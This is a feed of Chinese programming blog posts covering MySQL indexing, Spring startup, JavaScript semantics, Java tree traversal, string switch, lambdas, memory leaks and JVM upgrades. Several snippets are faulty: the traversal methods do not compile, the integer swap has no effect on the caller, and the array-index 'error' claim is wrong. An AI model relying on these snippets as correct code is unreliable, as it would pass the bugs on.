SELECT * FROM tbl_name WHERE key_col LIKE 'Patrick%';
SELECT * FROM tbl_name WHERE key_col LIKE 'Pat%_ck%';
        而下面的语句将不会使用索引：
SELECT * FROM tbl_name WHERE key_col LIKE '%Patrick%';
SELECT * FROM tbl_name WHERE key_col LIKE other_col;
        在第一句中，LIKE操作的字符串以通配符开头，而第二句中，LIKE操作的不是一个常量字符串。
        如果使用... LIKE '%string%'， 并且string不超过三个字符，MySQL将使用Turbo Boyer-Moore算法来初始化这个字符串模式，然后使用这个模式进行快速查找。
 
        对于创建了索引的列col_name,如果在where中包含有col_name is NULL，在操作时，MySQL也将使用索引。
 
        在一个AND组中，必须包含有索引前缀，才能在执行过程中使用索引，下面的WHERE语句将使用索引：
... WHERE index_part1=1 AND index_part2=2 AND other_column=3
    /* index = 1 OR index = 2 */
... WHERE index=1 OR A=10 AND index=2
    /* optimized like "index_part1='hello'" */
... WHERE index_part1='hello' AND index_part3=5
    /* 能在index1上使用索引，不能再index2或者index3上使用索引 */
... WHERE index1=1 AND index2=2 OR index1=3 AND index3=3;
         下面的WHERE语句无法使用索引：
/* index_part1索引没有被使用 */
... WHERE index_part2=1 AND index_part3=2
    /*  两部分的索引都没有使用  */
... WHERE index=1 OR A=10
    /* 没有索引跨越所有行  */
... WHERE index_part1=1 OR index_part2=10
         
 
       有时候，及时有索引满足条件，MySQL也不会使用它，会发生这种状况的一种情形是MySQL优化器认为使用索引会导致对整表很大一部分数据的访问，在这种情况下，直接的全表扫描可能更快，它花费的寻址时间更少。不过，如果这种查询使用limit限定只返回结果中的部分行，MySQL就会使用索引，这种只返回少量行的操作，通过索引会更快。
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
spring启动, chenchh201307094510.iteye.com.blog.2052862, Tue, 22 Apr 2014 21:15:23 +0800

    spring的启动和关闭是通过在web.xml中注册启动监听器org.springframework.web.context.ContextLoaderListener来实现的，该类实现了接口javax.servlet.ServletContextListener。伴随web容器的启动和关闭，管理Spring的根org.springframework.web.context.WebApplicationContext。
 
    该类本身并没有实现太多的代码，只是一个到org.springframework.web.context.ContextLoader和org.springframework.web.context.ContextCleanupListener的简单代理。
 
    如果在web.xml中配置了org.springframework.web.util.Log4jConfigListener，则该监听器必须配置在它的后面。在spring3.1之后，如果在Servlet 3.0以上环境，ContextLoaderListener支持通过ContextLoaderListener(WebApplicationContext)构造器，以编码的方式来注入web应用的根上下文，而不用再在web.xml中进行配置。
 
    当ContextLoaderListener在进行实例化的时候，会读取web.xml中配置的两个context-param参数：“contextClass“、“contextConfigLocation”。
 
   ContextLoaderListener实例化之后，将会被注册到ServletContext的WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE属性上。
 
    在Servlet3.0+环境中，使用ContextLoaderListener(WebApplicationContext)构造器，以编码的方式(非web.xml配置方式)通过javax.servlet.ServletContext.addListener接口注册该实例，如果context实例同时满足：实现ConfigurableWebApplicationContext接口、尚未刷新，将会产生以下操作：
如果context还没有id，将通过setId接口赋予id；
ServletContext、ServletConfig将被代理到context；
customizeContext方法将被调用；
所有通过contextInitializerClasses初始化参数配置的 ApplicationContextInitializer接口实现都将被应用；
调用refresh接口；
    如果context实例已经刷新或者没有实现ConfigurableWebApplicationContext接口，以上操作不会自动发生，需要用户根据自己的需用自行调用。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
js数组中逗号的奥义, chenchh201307094510.iteye.com.blog.1911073, Sun, 21 Jul 2013 14:24:22 +0800

    在创建一个js数组时，如果在数组的头部出现一个逗号或者中间出现两个相邻的逗号，都会被识别为一个未知的元素，其初始值为undefined，如下所示：
var a = [, '1', '2',,'4']; //数组的长度为5,其中a[0],a[3]的值均为undefined
    如果是在数组的尾部包含有一个逗号，该逗号会被直接忽略，在代码执行的过程中也不会出现任何异常如下所示：
    
var a = ['0', '1',] //该数组的长度为2，最后一个逗号将被忽略
    如果在数组的尾部包含连续的两个逗号，则会识别为一个未定义的元素，如下所示：
var a = ['0', '1', '2', ,];
console.log(a[3]); //打印undefined
console.log(a[4]); //error
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
javascript中的undefined与null, chenchh201307094510.iteye.com.blog.1911069, Sun, 21 Jul 2013 13:49:08 +0800

        在javascript中声明一个变量而未赋值时，值会被设定为undefined，试图取得一个未定义变量会导致一个控制台ReferenceError例外错误被抛出：
var a;
console.log("The value of a is " + a); // logs "The value of a is undefined"
console.log("The value of b is " + b); // throws ReferenceError exception
     未定义的undefined值在布尔类型下会被当作false，数值类型下undefined值会被转换为NaN：
var a;
a + 2 = NaN
     当你对一个空变量求值时，空值null在数值型下会被当作0来对待，而布尔类型下会被当作false。例如：
var n = null;
console.log(n * 32); // logs 0
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
javascript中字符串、数字之间的转换与操作, chenchh201307094510.iteye.com.blog.1911065, Sun, 21 Jul 2013 13:36:35 +0800

        在包含加法运算符的数字和字符串表达式中，JavaScript会把数字值转换为字符串。例如，假设有如下的语句：
 
x = "The answer is " + 42 // "The answer is 42"
y = 42 + " is the answer" // "42 is the answer"
 
 
        在包含其它运算符（译注：如下面的“-”）时，JavaScript语言不会把数字变为字符。例如:
 
"37" - 7 // 30
"37" + 7 // "377"
         代表一个数字的值在内存中是作为字符串保存的，这种情况下，有一些方法可以进行转换。将字符串转换为数字的一个替代方法，是使用加法运算符。
"1.1" + "1.1" = "1.11.1"
(+"1.1") + (+"1.1") = 2.2      //括号是为了更清晰，并不是必须的
 
 
 
        
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
二叉树的广度优先遍历, chenchh201307094510.iteye.com.blog.1908926, Wed, 17 Jul 2013 22:39:56 +0800

二叉树的广度优先遍历可以简单的理解为按层遍历，每层依次从左至右遍历，其实现如下：
 
public class TreeNode{
    //左子节点
    private TreeNode leftChild = null;
    //右子节点
    private TreeNode rightChild = null;
    //节点数据
    private int data = 0;
    
    //广度优先遍历
    private static String breadthFirstVisit(final TreeNode root){
        if(root == null){
            return null;
        }
        
        return visitNodes(new ArrayList<TreeNode>(1){{
            add(root);
        }});
    }
    
    private static String visitNodes(List<TreeNode> nodes){
        StringBuilder path = new StringBuilder();
        List<TreeNode> childNodes = new LinkedList<TreeNode>();
        Iterator<TreeNode> it = nodes.iterator();
        while(it.hasNext()){
            TreeNode node = it.next;
            path.append(node.data + ","); 
            
            if(node.leftChild != null){
                childNodes.add(node.leftChild);
            }
            if(node.rightChild != null){
                childNodes.add(node.rightChild);
            }
        }
        return path.append(visitNodes(childNodes));
    }
}
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
二叉树的前序遍历, chenchh201307094510.iteye.com.blog.1906794, Mon, 15 Jul 2013 23:08:10 +0800

二叉树的前序遍历主要规则是：
1. 先访问父节点，左子节点次之，又子节点再次之；
2. 如果子节点包含子节点，对子节点进行前序遍历
 
代码实现如下：
 
public class TreeNode{
    //左子节点
    private TreeNode left = null;
    //又子节点
    private TreeNode right = null;
    //数据
    private int data = 0;
    
    //前序遍历访问
    private static String headFirstVisit(TreeNode root){
        if(root == null){
            return "";
        }
        if(root.left == null && root.right == null){
            return root.data + ",";
        }
        StringBuilder path = new StringBuilder(root.data + ",");
        if(root.left != null){
            path.append(headFirstVisit(root.left));
        }
        if(root.right != null){
            path.append(headFirstVisit(root.right));
        }
        return path;
    }
}
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
原地整数交换, chenchh201307094510.iteye.com.blog.1906758, Mon, 15 Jul 2013 22:03:11 +0800

题目：将两个整数原地交换，不允许创建变量
 
解法：
        存在整数a、b，令x = a - b,  则交换公式为 b = x + b，a = b - x
 
 
代码如下
private void swapInPlace(int a, int b){
    a = a - b;
    b = b + a;
    a = b - a;
}
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java中字符串switch的实现细节, deepinmind.iteye.com.blog.2063515, Thu, 08 May 2014 08:54:30 +0800
自从Java允许在switch及case语句中使用字符串以来，许多开发人员都使用了这一特性，不过如果使用整型或者枚举的话会更好。这是JDK7中最受欢迎的特性之一，同样的还有自动资源管理以及多异常捕获。尽管我个人不太喜欢这个特性，因为使用枚举的方式其实更好，但我并不是特别反对使用它。一个原因当然是它很方便，如果程序中已经用到了字符串，这样做的确很顺手，不过我建议在生产环境的代码中使用新特性之前最好了解下它是如何工作的。我第一次听说这个特性的时候，我认为这肯定是通过equals()和hashCode()方法来实现的，我更关心的是Java 7中的字符串的switch是如何实现的。我对这个感兴趣还有一个原因，是我想在面试中问一下这个问题，如果面试中有类似这样的一个问题的话会非常有趣。验证它其实非常简单，你只需用字符串写一段switch的代码，然后反编译一下，看看编译器是如何翻译它们的就可以了。那么还等什么，赶快来看下switch中的字符串是如何工作的吧？ 原始代码：  这是一个简单的测试程序，它有一个main方法，里面有一个switch块在操作String变量。程序中用到的字符串参数是运行时传递进来的，你可以从main方法的字符串数组中获取到。有三种模式来启动这个程序，主动模式，被动模式，以及安全模式。对于这些已知的确定值，其实用枚举来实现要更好，但如果你已经决定使用字符串了，你得确保你写的是大写的，不要写成小成或者骆驼式的，这样会出现大小写敏感的问题。你还可以看下这篇教程 ，了解下如何在Java 7的switch表达式中正确地使用字符串。 
/** * Java Program to demonstrate how string in switch functionality is implemented in * Java SE 7 release. */ 
public class StringInSwitchCase { 
      public static void main(String[] args) { 
            String mode = args[0]; 
            switch (mode) { 
                  case "ACTIVE": 
                        System.out.println("Application is running on Active mode"); 
                        break; 
                  case "PASSIVE":
                        System.out.println("Application is running on Passive mode"); 
                         break; 
                  case "SAFE": 
                          System.out.println("Application is running on Safe mode"); 
          } 
      } 
}
   编译运行这段代码需要安装JDK7才行。随便哪个版本的JDK7都可以。 反编译后的代码：  下面是上述代码使用jdk1.7.0_40编译后再反编译的结果。如果你是Java新手，想知道如何反编译Java类来实现逆向工程，看下这篇文章。JDK的每个版本都会加入越来越多的语法糖，因此对于各个水平的Java开发人员来说，知道 如何反编译Java类是想当重要的。你写的代码和实现执行的差距会越来越大。了解Java类的文件格式以及字节码指令会对你很有帮助 。Java 8最近发布了一个新的特性，叫做lambda表达式，它通过编译器来实现了内部匿名类，你可以反编译下你的类文件来看下编译器都加了些什么。 
/** * Reverse Engineered code to show how String in Switch works in Java. */ 
import java.io.PrintStream; 
public class StringInSwitchCase{ 
      public StringInSwitchCase() { } 
      public static void main(string args[]) { 
             String mode = args[0]; 
            String s; switch ((s = mode).hashCode()) { 
                  default: break; 
                  case -74056953: 
                        if (s.equals("PASSIVE")) { 
                                    System.out.println("Application is running on Passive mode"); 
                         } 
                        break; 
                  case 2537357: 
                        if (s.equals("SAFE")) { 
                              System.out.println("Application is running on Safe mode"); 
                         } 
                        break; 
                  case 1925346054: 
                        if (s.equals("ACTIVE")) { 
                              System.out.println("Application is running on Active mode"); 
                         } 
                        break; 
               } 
          } 
}
   看到这个代码，你知道原来字符串的switch是通过equals和hashCode()方法来实现的。记住，switch中只能使用整型，比如byte。short，char以及int。还好hashCode()方法返回的是int，而不是long。通过这个很容易记住hashCode返回的是int这个事实，事实上我自己都会经常忘了或者弄混。仔细看下可以发现，进行switch的实际是哈希值，然后通过使用equals方法比较进行安全检查，这个检查是必要的，因为哈希可能会发生碰撞。因此它的性能是不如使用枚举进行switch或者使用纯整数常量，但这也不是很差。因为Java编译器只增加了一个equals方法，如果你比较的是字符串字面量的话会非常快，比如"abc" =="abc"。如果你把hashCode()方法的调用也考虑进来了，那么还会再多一次的调用开销，因为字符串一旦创建了，它就会把哈希值缓存起来，这个可以看下我自己比较喜欢的一篇文章 为什么Java中的字符串是不可变的。因此如果这个siwtch语句是用在一个循环里的，比如逐项处理某个值，或者游戏引擎循环地渲染屏幕，这里hashCode()方法的调用开销其实不会很大。不管怎样，我仍然认为使用字符串的switch来代表几个固定的值不是一个最佳实践，Java里的枚举的存在是有它的原因的，每个Java开发人员都应该使用它。 这就是Java 7如何实现的字符串switch。正如我所料，它使用了hashCode()来进行switch，然后通过equals方法进行验证。这其实只是一个语法糖，而不是什么内建的本地功能。选择权在你，我个人来说不是很喜欢在switch语句中使用字符串，因为它使得代码更脆弱，容易出现大小写敏感的问题，而且编译器又没有做输入校验 。事实上对于性能关键的代码，以前的整型常量和枚举的写法是我的最爱，在这里可读性和代码质量都更重要。事实上，99。99%的情况下，枚举都比使用字符串的switch或者整型要好，这也是它们存在于Java语言中的实际意义 。这个特性就是为了改变这种不良的编码实践而生的，我很难找到什么情况下非要针对一组输入值在switch分支中使用字符串，如果你有一个令人信服的使用字符串switch的原因，请告诉我，我或者会改变我现在的想法。 译注：更深入的话可以了解下Java在字节码层面是如何实现的，可参考这篇文章。 原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接    
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java函数式编程(十四)监控文件修改, deepinmind.iteye.com.blog.2062386, Wed, 07 May 2014 08:18:23 +0800
本系列文章译自Venkat Subramaniam的Functional Programming in Java  未完待续，后续文章请继续关注[url={{ site.url }}]Java译站[/url]。 使用flatMap列出子目录  前面已经看到如何列出指定目录下的文件了。我们再来看下如何遍历指定目录的直接子目录（深度为1），先实现一个简单的版本，然后再用更方便的flatMap()方法来实现。 我们先用传统的for循环来遍历一个指定的目录。如果子目录中有文件，就添加到列表里；否则就把子目录添加到列表里。最后，打印出所有文件的总数。代码在下面——这个是困难模式的。 
public static void listTheHardWay() {
     List<File> files = new ArrayList<>();
     File[] filesInCurrentDir = new File(".").listFiles();
     for(File file : filesInCurrentDir) {
          File[] filesInSubDir = file.listFiles();
               if(filesInSubDir != null) {
                     files.addAll(Arrays.asList(filesInSubDir));
               } else {
                    files.add(file);
               }
      }
     System.out.println("Count: " + files.size())
}
  我们先获取当前目录下的文件列表，然后进行遍历。对于每个文件，如果它有子文件，就把它们添加到列表中。这样做是没问题的，不过它有一些常见的问题：可变性，基本类型偏执，命令式，代码冗长，等等。一个叫flatMap()的小方法就可以解决掉这些问题。 正如这个名字所说的，这个方法在映射后会进行扁平化。它会像map()一样对集合中的元素进行映射。但是和map()方法不同的是，map()方法里面的lambda表达式只是返回一个元素，而这里返回的是一个Stream对象。于是这个方法将多个流压平，将里面的每个元素映射到一个扁平化的流中。 我们可以用flatMap()来执行各种操作，不过现在手头的这个问题就正好诠释了它的价值。每个子目录都有一个文件的列表或者说流，而我们希望获取当前目录下的所有子目录中的文件列表。 有一些目录可能是空的，或者说没有子元素。这种情况下，我们将这个空目录或者文件包装成一个流对象。如果我们想忽略某个文件，JDK中的flatMap()方法也可以很好的处理空文件；它会把一个空引用作为一个空集合合并到流里。来看下flatMap()方法的使用。 
public static void betterWay() {
     List<File> files =
          Stream.of(new File(".").listFiles())
               .flatMap(file -> file.listFiles() == null ?
                    Stream.of(file) : Stream.of(file.listFiles()))
               .collect(toList());
     System.out.println("Count: " + files.size());
}
  我们先是获取了当前目录的子文件流，然后调用了它的flatMap()方法。然后将一个lambda表达式传给这个方法，这个表达式会返回指定文件的子文件的流。flatMap()方法返回的的是当前目录所有子目录下的文件的集合。我们使用collect()方法以及Collectors里面的toList()(方法把它们收集到一个列表中。 我们传给flatMap()的这个lambda表达式，它返回的是一个文件的子文件。 如果没有的话，则返回这个文件的流。flatMap()方法优雅地将这个流映射到一个流的集合中，然后将这个集合扁平化，最终合并到一个流中。 flatMap()方法减少了许多开发的工作——它将两个连续的操作很好的结合到了一起，这通常称为元组 ——用一个优雅的操作就完成了。 我们已经知道如何使用flatMap()方法来将直接子目录中的所有文件列出来。下面我们来监控一下文件的修改操作。 监控文件修改  我们已经知道如何查找文件及目录，不过如果我们希望在文件创建，修改或删除的时候，能够接收到提示消息的话，这个也非常简单。这样的机制对于监视一些特殊文件比如配置文件，系统资源的改动非常有用。下面我们来探索下Java 7中引入的这个工具，WatchService，它可以用来监控文件的修改。下面我们看到的许多特性都来自JDK 7，而这里最大的改进就是内部迭代器带来的便利性。 我们先来写个监控当前目录中的文件修改的例子。JDK中的Path类会对应文件系统中的一个实例，它是一个观察者服务的工厂。我们可以给这个服务注册通知事件，就像这样： 
inal Path path = Paths.get(".");
final WatchService watchService =
       path.getFileSystem()
           .newWatchService();
       path.register(watchService, StandardWatchEventKinds.ENTRY_MODIFY);
System.out.println("Report any file changed within next 1 minute...");
  我们注册了一个WatchService来观察当前目录的修改。你可以轮询这个WatchService来获取目录下文件的修改操作，它会通过一个WatchKey将这些改动返回给我们。一旦我们拿到了这个key，可以遍历它的所有事件来获取文件更新的详细信息。因为可能会有多个文件被同时修改，poll操作可能会返回多个事件。来看下轮询以及遍历的代码。 
final WatchKey watchKey = watchService.poll(1, TimeUnit.MINUTES);
if(watchKey != null) {
     watchKey.pollEvents()
          .stream()
          .forEach(event ->
               System.out.println(event.context()));
}
  这里可以看到，Java 7和Java 8的特性同时出场了。我们把pollEvents()返回的集合转化成了一个Java 8的Stream，然后使用它的内部迭代器来打印出每个文件的详细的更新信息。 我们来运行下这段代码，然后将当前目录下的sample.txt文件修改一下，看下这个程序是否能察觉这个更新。 
Report any file changed within next 1 minute...
sample.txt
  当我们修改了这个文件的时候，程序会提示说文件被修改了。我们可以用这个功能来监视不同文件的更新，然后执行相应的任务。当然我们也可以只注册文件新建或者删除的操作。 总结  有了lambda表达式和方法引用后，像字符串及文件的操作，创建自定义比较器这些常见的任务都变得更简单也更简洁了。匿名内部类也变得优雅起来了，而可变性就像日出后的晨雾一样，也消失得无影无踪了。使用这种新风格进行编码还有一个福利，就是你可以使用JDK的新设施来高效地遍历庞大的目录。 现在你已经知道如何创建lambda表达式并把它传递给方法了。下一章我们会介绍如何使用函数式接口及lambda表达式进行软件的设计。  未完待续，后续文章请继续关注[url={{ site.url }}]Java译站[/url]。 原创文章转载请注明出处：http://it.deepinmind.com
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
为什么不应该加班？, deepinmind.iteye.com.blog.2062385, Wed, 07 May 2014 08:15:36 +0800
经常加班有好处也有坏处，下面我会把它们一一都列举出来。有些原因大家都知道，有些则是我个人的经验，如果你还有别的理由，请不吝赐教，我会把它们加到列表里来。 加班的坏处：  你正在制造新的BUG    你不可能长时间的集中精力，如果你的大脑没有休息好的话，注意力会急剧下降。就算在早晨已经休息得很好，非常专注的时候，你也可能会写出BUG，真不敢想像晚上10点那会儿灾难性的时刻。一天8小时的脑力劳动对你的大脑来说已经够多的了。 你改动的代码没法及时评审    代码评审（Code Review）是一个非常有用的工具，它也被许多团队广泛地采用，这样能够保证代码的质量。如果代码写完很快就开始评审并且可以和团队成员面对面的进行沟通，这样的效果是最好的。使用Gerrit，Reviewboard的效果也还不错。但如果早上一来发现昨晚有人加班提交了一大坨代码上来的话，效果是最差的。  故事点估算变得不靠谱了     任何一个敏捷团队中最痛苦的部分莫过于故事点估算了（Kanban里面好点，Scrum里面更痛苦些）。这不仅痛苦，压力山大，而且时间还长，所有的参与者都感到身心疲惫。估算的主要是故事的复杂性和时间安排。时间一般是按一周5天，每天8小时来算。现在倒好，如果大家都加班的话，所有的估算都白扯了。团队的士气会受到打击。  造成同事间的关系紧张    我注意到一点，如果团队中有人加班很晚的话，是会造成同事间的敌对和紧张的。为什么？正常下班的同事会担心由于他们没有在公司加班到很晚，会危害到自己的职业生涯。而加班很晚的人会觉得别的同事都对工作不感兴趣，不上心。解决办法？很简单，大家都正常下班就好了。产生过高的期望    大家都知道，人们总是得寸进尺的。你经常加班工作的话，你的老大很快就会期待你能够一直待得很晚。  失去了生活中非常重要的一部分    是的，你懂的。  加班的好处：  无。  原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接   
已有 22 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java的内存泄露, deepinmind.iteye.com.blog.2061928, Tue, 06 May 2014 09:53:06 +0800
 Java有垃圾回收，因此不会出现内存泄露。 大错特错。  这个说法存在好几个问题。尽管Java的确有垃圾回收器来回收那些不用的内存块，但你不要指望它能够点铁成金。GC减轻了开发人员肩上的负担，而原本的那些工作非常容易出错，不过并不是所有内存分配的问题它都能够解决。更糟糕的是，Java的设计允许它可以欺骗GC，使得它能够保留一些程序已经不再使用的内存。经历了20年的C开发以及7年的Java开发后（中间有重叠），我敢说，在这方面Java绝对是远比C/C++要好。尽管它仍有改进的空间。在这些改进成为现实之前，作为开发人员最好能了解下内存处理的基本原理以及一些常见的坑，以免栽到里面去。但首先， 什么是内存泄露？    内存泄露是指程序不停地分配内存，但不再使用的时候却没有释放掉它，这会导致本来就有限的内存的占用量出现飙升，并且这不受程序控制，最终导致程序的运行变慢。  在那些美好的C语言开发的时代，我们说的内存泄露是指程序遗失了某个内存段的引用而没有释放掉它。这种情况下，程序获取不到这个内存区域的句柄或者指针，也无法调用free函数来释放掉它，因此这个内存块会一直处于分配的状态，没法被程序重用，这样就造成了内存的浪费。当然了，程序退出的话，操作系统会回收掉这块内存的。 这是个非常典型的内存泄露，不过我上面给出的定义更广泛一些。还有一种情况是代码仍旧拥有这块内存的指针，尽管现在这块内存已经不用了，但程序也不去释放它。就比如说一个程序员创建了一个链表，把所有通过malloc分配的内存指针全存了进去，但他从来不去调用free函数释放掉它们。结果也是一样的。既然结果是一样的，能不能获取到释放内存的指针也不那么重要了，因为你根本就不去释放它。这只是影响到了解决问题的方式，不过不管是哪种情况，修复BUG总是得修改代码的。 如果我们来看下Java和它的GC，你会发现经典的那个由于释放了内存引用导致无法释放内存的那种情况几乎不可能发生。如果是那样的话GC判断出分配的内存的所有引用已经释放掉了就自己去释放内存了。事实上，这也是Java里面标准的释放内存的方法：你只需不再引用某个对象就可以了，GC会去回收它的。这里没有垃圾桶，也没有分类垃圾箱（不需要你去扔垃圾）。别管它就行了，垃圾回收器会去回收它的。这也正是很多开发人员认为Java不存在内存泄露的原因。从实际的角度来看这的确几乎是正确的：和使用C/C++或者其它没有垃圾回收器的语言相比，使用Java开发内存泄露的麻烦事的确少了不少。 我们终于要说到重点了：Java里面是如何发生内存泄露的？ 线程以及线程本地存储就非常容易产生内存泄露。通过下面的五个步骤可以很容易地产生内存泄露： 1. 应用程序创建一个长时间运行的线程（或者使用线程池，那样泄露会更快一些）。2. 线程通过某个类加载器加载了一个类。3. 这个类分配了一大块内存（比如，new byte[1000000])，并且在它的静态字段中存储了一个强引用，然后在ThreadLocal中存储它自身的一个引用。额外分配的这个内存（new byte[1000000]）其实是多余的（类实例的泄露就足够了），不过这样能使内存泄露的速度更快一些。4. 线程清理了自定义的类以及加载它的类加载器的所有引用。5. 重复以上步骤。 因为你已经没有这个类以及它的类加载器的引用了，也就不能再访问它的ThreadLocal中的存储了，因此你也就无法访问分配的这块内存（除非你开始用反射来获取）。但是这个ThreadLocal的存储还存在引用，因此GC无法回收这块内存。这个线程本地的存储不是弱引用（顺便提一句，为什么不用弱引用？） 如果你从来没有类似的经验，你可能会想，这得多脑残才能搞出这么极端的一个场景。但事实上，上述这种泄露的模式是非常自然的（好吧，程序员们，你们可别故意这么搞 ），当你在Tomcat上调试自己的程序的时候就会出现这样的泄露。对Java来说这太正常了。重新部署应用但却不重启Tomcat实例，这通常会导致内存越来越少，这正是发生了上述的这种泄露，很少有Tomcat能够避免这种情况。应用程序应当谨慎地使用ThreadLocal。 使用静态变量存储大块数据时也应当同样小心。最好避免使用静态变量，除非你很相信这个运行你程序的容器不会发生泄露。这些容器的类加载的层次结构和Java的比起来要灵活多了。如果你把大量的数据存储到一个Map或者Set里，为什么不使用它们的弱引用的版本呢？如果KEY都没了，还需要关联的那个值干嘛？ 现在来说下HashMap和HashSet。如果你使用了没有实现或者错误地实现了eqauls和hashCode方法的对象来作为KEY的话，调用put()方法会把你的数据扔向深渊。你再也没法恢复它了，更糟糕的是，每当你再放一个对象到这个集合中的时候，还会产生更多的副本。你把你的内存带上了一条不归路。 在Java中，还有许许多多的内存泄露的例子。尽管它们和C/C++相比，出现的频率要少得多。通常来说，有GC总比没有的要好。 原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接
已有 9 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
64位JVM带来的问题及解决方案, deepinmind.iteye.com.blog.2059919, Mon, 05 May 2014 09:21:18 +0800
这篇文章会检验你有关JVM的知识以及项目交付相关的技能；尤其是涉及到JVM升级的时候。期待你们的评论及回复，一起探讨下如何规避这类的项目可能产生的性能问题。  背景  最近碰到了一个影响到线上生产环境的问题，我们使用的是WebLogic 10以及32位的Hotspot JVM 1.6 。鉴于目前的一些问题以及未来负载上升的预测，我们决定将HotSpot JVM 1.6升级成64位的。 注意我们并没有修改JVM的启动参数。 经过几周的功能测试及规划，这次升级成功地部署到了线上环境。不过，技术支持团队发现第二天便出现了严重的性能下降，其中还有线程锁竞争的问题，迫使部署团队不得不回滚了这次升级。 最终我们找到了问题的原因，而这次升级也将在最近重新进行发布。 问题: 从上面这些信息来看，说一下你认为可能导致这次性能下降的原因。 说一下这次升级有什么好处，对于这类升级的如何进行管理以及降低风险，给出一些你的建议。 答案： 我经常听到有人说只要从32位JVM升级到64位就能自动获得性能的提升。这只说对了部分。有显著的性能提升的前提是在这之前你的系统存在内存占用的问题比如过度GC或者java.lang.outofmemoryerror，并且你也进行了适当的调优及堆大小的调整。 不幸的是，我们通常都忽略了一个事实，对于 64位的JVM来说，系统中的本地指针会占用8个字节，而不是4个。这会导致你的程序的内存占用量的增加，因此会带来更频繁的GC以及性能的下降。 下面是Oracle的官方解释： 64位的虚拟机和32位的比起来，性能上有什么不同？ 一般来说，和32位的虚拟机相比，同样的程序在64位机上仅需花费很小的_性能损失_就能获得更大的寻址空间。这是由于系统的本地指针在64位虚拟机中会占用8个字节。这些额外字节的加载会对内存的使用带来影响，其结果就是程序执行的速度会变稍微的变慢，具体是多少取决于你的Java程序在执行的过程中需要加载多少指针。好消息是AMD64和EM64T平台在64位模式下运行的时候，Java虚拟机能获得额外的寄存器，来生成更高效的本地指令序列。这些额外寄存器带来的性能提升几乎能弥补64位虚拟机带来的执行速度的下降。SPARC平台上64位虚拟机和32位的相比，大概会有10%～20%的性能下降。AMD64和EM64T平台上则大概是0%～15%，这取决于你应用程序执行的时候有多少指针了。 现在回到我们开始说的那个问题上，内存占用量有了显著的增加，这就是导致性能问题的罪魁祸首。根据你选择的GC策略，GC的老生代回收会导致JVM和线程的暂停时间变得更长，这引发了线程锁竞争以及其它的问题。从下图可以看到，升级到64位JVM后应用程序的内存占用量（老生代）增加了45%。 Java堆的使用量 ~老年代回收后占用量大概是900MB（32位）      Java堆的使用量 ~老年代回收后占用量大概是1.3GB(64位)      应用程序的Java堆的内存占用量增加了45%。当然这是本地指针的大小膨胀了的缘故。  还有一个问题就是在项目支付前，只进行了功能测试，而没有进行性能测试及压力测试。并且也没有对JVM参数的进行修改或者调整，这自然就增长了旧生代回收的频率以及GC的暂停时间。最终的解决方案是将堆的大小从2GB增加到2.5GB，并且开启压缩指针的选项。 现在你已经明白问题是什么了，下面是我关于类似升级的一些建议： 1. 进行性能压测，比较下应用程序在32位和64位时的内存占用量和GC的表现。2. 确保有足够的时间来进行GC参数及堆大小的调优，以便减少GC的暂停时间。3. 如果你用的是HotSpot JVM1.6 6u23以后的版本，可以启用指针压缩这个选项。这个选项使得JVM可以通过Java堆的某个64位的起始地址的32位的偏移量来表示大部分的指针；这样就减少了升级再来的内存占用量的增加。4. 正确地规划你的JVM进程所在的宿主机的容量。确保内存和CPU的能力满足这次升级带来的额外的内存和CPU的消耗。5. 采用一种低风险的升级策略，只升级线上环境的部分机器到64位JVM，比如说25%～50%。这样你还可以比较下现有的32位机器以及新升级的机器的表现，确保性能带来的收益及损失满足你的预期。  原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接     
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
数据库连接池简析, deepinmind.iteye.com.blog.2059499, Sun, 04 May 2014 09:18:25 +0800
序言   我参与的这些项目都用到了数据库连接池，这自然是有它的原因的。有时候我们可能会忘了当初为什么使用了某种设计模式或者某项技术，因此很有必要从头再推理一遍。每项技术或者技术决策肯定都有它的优势和劣势，如果发现它没有缺点的话，那你最好仔细想想是不是漏掉了什么。 数据库连接的生命周期  数据库的每一个读写操作都需要有一个连接。我们来看下数据库连接的调用流是什么样的：   调用流程是这样的： 1. 应用程序的数据访问层请求DataSource来获取一个数据库连接。2. DataSource使用数据库驱动来打开一个数据库连接。3. 创建数据库连接，同时打开了一个TCP socket。4. 应用程序进行数据库的读写。5. 连接已经不再需要了，因此关闭它。6. 关闭socket。 很容易可以看到，数据库连接的打开和关闭是非常昂贵的。PostgreSQL会为每个客户端连接分配一个单独的操作系统进程，因此高频率的打开关闭操作会使你的数据库管理系统负担很重。 重用数据库连接最主要的原因是： 1. 减少应用程序与数据库之间创建/销毁TCP连接的开销2. 减少JVM的垃圾对象。 池还是非池  我们来将不用连接池的实现和HikariCP进行对比，HikariCP应该是最高效的连接池框架了。 测试程序会创建并关闭1000个连接。 
